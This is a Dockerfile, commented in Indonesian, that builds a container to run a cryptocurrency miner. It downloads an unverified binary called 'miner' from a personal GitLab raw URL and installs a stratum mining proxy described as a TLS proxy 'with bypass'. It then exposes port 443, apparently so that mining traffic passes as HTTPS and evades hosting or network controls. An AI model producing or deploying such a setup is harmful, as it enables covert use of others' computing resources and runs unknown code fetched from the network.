FROM node:18

WORKDIR /app

RUN apt-get update && apt-get install -y \
    curl wget git build-essential procps python3 python3-pip python3-dev python3-venv \
    && rm -rf /var/lib/apt/lists/*

# Binary Miner Custom Kamu
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

# Install TLS Proxy dengan bypass
RUN pip3 install aiostratum-proxy --break-system-packages

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 443

CMD ["./start.sh"]
